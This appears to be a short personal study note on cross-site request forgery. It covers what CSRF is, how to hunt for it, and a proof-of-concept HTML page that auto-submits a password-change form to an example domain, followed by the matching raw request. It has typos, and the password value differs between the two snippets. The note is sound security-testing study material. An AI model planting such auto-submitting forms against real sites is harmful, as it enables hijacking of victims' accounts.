# Cross-Sire Request Forgery Overview

CSRF is a client-side technique used to attack other users of a web application

* Allows attackers to send HTTP requests that pretend to come from the victim in order to carry out unwanted actions on their behalf
* CSRF attacks usually target state-changing requests instead of requests that reveal sensitive information since they wouldn't be able ti read the response to the forged requests sent during an CSRF attack
* Can be used to trigger injection vulnerabilities (*XSS*, *Command injections*, *etc.*)

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Hunting for CSRF

## Step 1: Spot State-Changing Actions

* Search for any activity within a web application for any activity that alters data

## Step 2: Look for a Lack of CSRF Protections

* Intercept the requests for any activity that alters data
* CSRF tokens can come in many forms besides POST body parameters

## Step 3: Confirm the Vulnerability

* You can confirm the vulnerability by crafting a malicious HTML page and visit that page to see if the action has executed

```HTML
<html>
    <form method="POST" action="https://email.example.com/password_change" id="csrf_form">
        <input type="text" name="new_password" value="ab123">
        <input type="submit" value="Submit">
    </form>
    <script>document.getElementById("csrf_form").submit();</script>
</html>
```
```Text
POST /password_change
Host: email.example.com
Cookie: session_cookie=<SESSION_COOKIE>

(POST request body)
new_password=abc123
```

